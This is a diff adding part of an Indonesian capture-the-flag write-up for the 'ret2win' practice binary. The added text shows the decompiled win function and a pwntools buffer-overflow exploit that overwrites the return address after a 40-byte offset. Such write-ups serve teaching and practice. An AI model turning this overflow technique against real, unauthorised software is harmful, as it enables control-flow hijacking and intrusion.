@@ -50,5 +50,44 @@ ke sini
 
 ![Preview](image/2.png)
 
+```
+void ret2win(void)
 
+{
+  puts("Well done! Here\'s your flag:");
+  system("/bin/cat flag.txt");
+  return;
+}
+```
+
+kurang lebih begini exploit nya
+
+```
+from pwn import *
+
+context.binary = elf = ELF("./ret2win")
+context.terminal = ['xfce4-terminal', '-e']
+#context.log_level = 'debug'
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
+	p = gdb.debug([elf.path],'''
+            b *main
+            continue
+        ''')
+else:
+    p = process()
+
+offset = 40
+win = 0x0000000000400757
+
+payload = b'A'*offset
+payload += p64(win)
+
+p.sendline(payload)
+p.interactive()
+```
+
+dan ini hasil outputnya 
+
+![Preview](image/3.png)
 
